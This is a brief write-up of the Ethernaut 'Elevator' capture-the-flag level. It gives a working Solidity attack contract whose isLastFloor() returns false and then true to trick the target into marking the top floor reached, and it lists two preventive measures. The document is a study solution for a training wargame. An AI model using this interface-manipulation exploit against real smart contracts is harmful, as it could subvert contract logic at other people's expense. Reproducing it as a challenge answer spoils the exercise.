
# Ethernaut Level 11 Elevator
- This level is Elevator Problem, where we need to reach the top floor.
- For solving this challenge, we need to understand flow of the contract.
- Building variable depends upon msg.sender so if our contract contains ```isLastFloor()``` we can manipulate the elevator as it is last floor.
- First we need to receive false to execute inside the if condition and again need to receive true to place the top as true.
# Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/elevator.sol";

contract ElevatorAttack{
    uint256 public count = 0;
    Elevator public elevator;

    constructor(address _elevator){
        elevator = Elevator(_elevator);
    }
    // need to be exact buiding interface function or else it won't execute
    function isLastFloor(uint _floor) external returns (bool){
        require(_floor > 0);
        count++;
        return count > 1;
    }
    // we can pass any floor
    function attack() external{
        elevator.goTo(21);
    }
    
} 
```
# Preventive Measures
-  Use trusted external contracts in developing contracts.
- Never update state in other contract decision.
 



